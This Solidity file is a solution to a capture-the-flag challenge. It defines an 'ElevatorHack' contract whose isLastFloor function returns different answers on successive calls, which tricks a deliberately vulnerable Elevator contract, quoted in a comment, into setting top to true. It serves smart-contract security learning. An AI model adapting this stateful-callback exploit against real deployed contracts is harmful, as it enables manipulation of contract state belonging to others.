// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IElevator {
    function goTo(uint256) external;
    // Public state variables like `top` automatically generate a getter.
    // so we can grab the state variable with this getter function.
    function top() external view returns (bool);
}

contract ElevatorHack {
    // State variable `target` to interact with the IElevator interface contract.
    IElevator private immutable target;
    uint256 counter;

    constructor(address _targetAddress) {
        // `target` becomes the interface contract at the deployed target address.
        // Allowing us to call it's functions we grabbed from the interface.
        target = IElevator(_targetAddress);
    }

    function attack() external {
        // Call the `goTo` function of `Elevator`. Floor uint doesn't matter.
        target.goTo(42);
        // Reverts unless `top` is true!
        require(target.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) {
        // Returns false on first call, true on second call.
        counter++;
        return counter > 1;
    }
}


/*
// Target Contract

pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
*/